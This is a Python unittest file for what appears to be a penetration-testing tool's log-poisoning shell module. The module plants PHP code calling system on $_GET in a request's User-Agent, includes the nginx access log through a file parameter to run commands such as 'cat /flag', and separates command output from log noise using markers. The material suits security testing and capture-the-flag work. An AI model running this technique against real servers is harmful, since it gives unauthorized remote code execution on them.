"""Running a command out of a file the target writes for itself.

The route that works when every wrapper is refused: an application that accepts
nothing containing `://` still hands a plain path to include(), and the access
log is a plain path. What makes it awkward is that the whole log gets included,
so the answer arrives inside a wall of other people's traffic - and most of what
is worth testing here is about telling that answer apart from the noise.
"""

from __future__ import annotations

import re
import unittest
from types import SimpleNamespace
from urllib.parse import unquote

from injectorkit.core.httpmsg import Headers, Request
from injectorkit.core.params import Param, Where
from injectorkit.modules.proto.shell import LogPoisonShell

LOG = "/var/log/nginx/access.log"
TARGET = Request(
    method="POST",
    url="https://t/",
    headers=Headers([("Content-Type", "application/x-www-form-urlencoded")]),
    body=b"file=index.php",
)


def make(answer=None, bodies=None):
    """A shell whose transport records what was sent and answers from a function."""
    sent: list[Request] = []
    queue = list(bodies or [])

    class Ctx:
        config = {"request": TARGET}

        def send(self, request, action=""):
            sent.append(request)
            text = answer(request) if answer is not None else queue.pop(0)
            response = SimpleNamespace(error="", body=b"", text=text)
            return SimpleNamespace(response=response)

    param = Param(where=Where.BODY, name="file", value="")
    shell = LogPoisonShell(Ctx(), param, LOG)
    return shell, sent


def markers_in(url: str) -> tuple[str, str]:
    """The two markers the shell put in the request, in the order it put them."""
    found = re.findall(r"echo\s+(ik[0-9a-f]{10})", unquote(url))
    return (found[0], found[1]) if len(found) >= 2 else ("", "")


class ThePlant(unittest.TestCase):
    def test_php_source_goes_into_the_user_agent(self):
        # The one field a server records verbatim, without escaping it.
        shell, sent = make(bodies=["x"])
        shell._planted = True
        shell("id")
        self.assertEqual(len(sent), 1)

    def test_the_first_command_plants_before_it_asks(self):
        shell, sent = make(bodies=["first", "second"])
        shell("id")
        self.assertEqual(len(sent), 2)
        agent = sent[0].headers.get("User-Agent") or ""
        self.assertIn("<?php", agent)
        self.assertIn("system", agent)
        self.assertIn("$_GET", agent)

    def test_it_is_planted_once_however_many_commands_follow(self):
        shell, sent = make(bodies=["plant", "a", "b"])
        shell("id")
        shell("id")
        self.assertEqual(len(sent), 3)


class TheInclude(unittest.TestCase):
    def test_the_log_path_is_what_gets_included(self):
        # The parameter is in the body, so that is where the path goes.
        shell, sent = make(bodies=["nothing"])
        shell._planted = True
        shell("id")
        self.assertIn("access.log", unquote(sent[0].body.decode("latin-1")))

    def test_the_command_travels_beside_it(self):
        shell, sent = make(bodies=["nothing"])
        shell._planted = True
        shell("cat /flag")
        self.assertIn("cat /flag", unquote(sent[0].url))


class FindingTheAnswerInTheNoise(unittest.TestCase):
    def test_the_output_between_the_markers_comes_back(self):
        def answer(request):
            start, end = markers_in(request.url)
            # a wall of other people's traffic on either side, as a real log has
            return f'1.2.3.4 - - "GET / HTTP/1.1" 200 9 "-" "curl"\n{start}uid=0(root){end}\n'

        shell, _ = make(answer=answer)
        shell._planted = True
        self.assertEqual(shell("id"), "uid=0(root)")

    def test_a_missing_marker_is_reported_rather_than_silence(self):
        # Silence would read as "the command printed nothing", which is a much
        # more reassuring answer than the truth.
        shell, _ = make(bodies=["no markers in this log"])
        shell._planted = True
        self.assertIn("marker never came back", shell("id"))

    def test_a_command_that_prints_nothing_says_so(self):
        def answer(request):
            start, end = markers_in(request.url)
            return f"{start}{end}"

        shell, _ = make(answer=answer)
        shell._planted = True
        self.assertIn("printed nothing", shell("id"))

    def test_an_older_runs_marker_cannot_be_mistaken_for_this_ones(self):
        def answer(request):
            start, end = markers_in(request.url)
            # a previous run's pair, complete, appears before this one's
            return f"ikAAAAAAAAAAstaleikBBBBBBBBBB{start}right{end}"

        shell, _ = make(answer=answer)
        shell._planted = True
        self.assertEqual(shell("id"), "right")


if __name__ == "__main__":
    unittest.main()
